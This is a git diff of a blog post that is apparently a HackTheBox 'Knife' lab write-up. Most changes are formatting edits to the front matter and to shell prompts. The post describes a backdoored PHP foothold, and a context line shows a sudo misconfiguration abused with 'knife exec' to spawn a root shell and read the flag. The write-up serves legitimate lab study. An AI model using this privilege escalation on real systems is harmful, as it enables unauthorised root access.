@@ -3,23 +3,14 @@ title: HTB | Knife
 description: Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell. 
 slug: knife-htb
 date: 2025-01-22 00:00:00+0000
-cover:
-  image: cover.png
-  hidden: true     # cache la bannière
+#image: cover.png
 categories:
     - HackTheBox
 tags:
     - Linux
     - Easy
-weight: 1       ## You can add weight to some posts to override the default sorting (date descending)
+#weight: 1
 ---
-<!-- 
-<img src="cover.png" alt="Knife cover" class="logo-htb">
-
-| Machine name   | OS         | IP           | Difficulty |
-| :-----------:  | :--------: | :----------: | :--------: |
-| Knife          | Linux      | 10.10.10.242 | Easy       |
- -->
 
 <table style="border:none; width:100%;">
   <tr>
@@ -169,9 +160,9 @@ Matching Defaults entries for james on knife:
 User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
 james@knife:/home$ sudo knife exec -E 'exec "/bin/sh"'
-## whoami
+# whoami
 root
-## cd /root
-## cat root.txt
+# cd /root
+# cat root.txt
 3db8b.....ce60
 ```
